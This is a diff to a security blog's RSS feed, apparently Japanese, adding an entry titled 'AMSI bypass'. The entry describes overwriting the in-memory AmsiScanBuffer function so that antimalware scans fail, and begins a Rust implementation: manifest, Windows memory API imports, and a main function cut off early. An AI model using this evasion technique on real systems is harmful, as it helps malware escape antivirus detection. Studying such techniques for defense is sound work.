@@ -12,6 +12,16 @@
     <language>ja-JP</language>
     <lastBuildDate>Wed, 11 Oct 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://famasoon.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>AMSI bypass</title>
+      <link>https://famasoon.github.io/posts/amsibypass/</link>
+      <pubDate>Wed, 11 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://famasoon.github.io/posts/amsibypass/</guid>
+      <description>スキャン要求を失敗させるために、すでにメモリにロードされているAMSI ライブラリ自体のコードを改ざんする. メモリにすでにロードされている AmsiScanBuffer というライブラリを探し出し、そのアドレスの命令を上書きしてエラーメッセージを表示させます。この攻撃では、マルウェアがメモリ内のライブラリ「AmsiScanBuffer」を探し出し、そのアドレスの命令を、エラーメッセージにリダイレクトする新しい命令で上書きします。
+[package] name = &amp;#34;amsibypass&amp;#34; version = &amp;#34;0.1.0&amp;#34; edition = &amp;#34;2021&amp;#34; # See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html [[bin]] name = &amp;#34;amsi_bypass&amp;#34; path = &amp;#34;src/main.rs&amp;#34; [dependencies] winapi = {version = &amp;#34;0.3.9&amp;#34;, features=[&amp;#34;memoryapi&amp;#34;, &amp;#34;libloaderapi&amp;#34;, &amp;#34;processthreadsapi&amp;#34;]} win32-error = &amp;#34;0.9.0&amp;#34; use std::{ffi::CString, ptr}; use winapi::{ um::{ memoryapi::{ VirtualProtect, WriteProcessMemory }, libloaderapi::{ LoadLibraryA, GetProcAddress }, processthreadsapi::GetCurrentProcess, winnt::PAGE_READWRITE }, shared::{ minwindef::{ DWORD, FALSE }, ntdef::NULL } }; fn main() { println!</description>
+    </item>
+    
+    <item>
       <title>Offensive Rustのレビュー</title>
       <link>https://famasoon.github.io/posts/offensiverustreview/</link>
       <pubDate>Wed, 11 Oct 2023 00:00:00 +0000</pubDate>
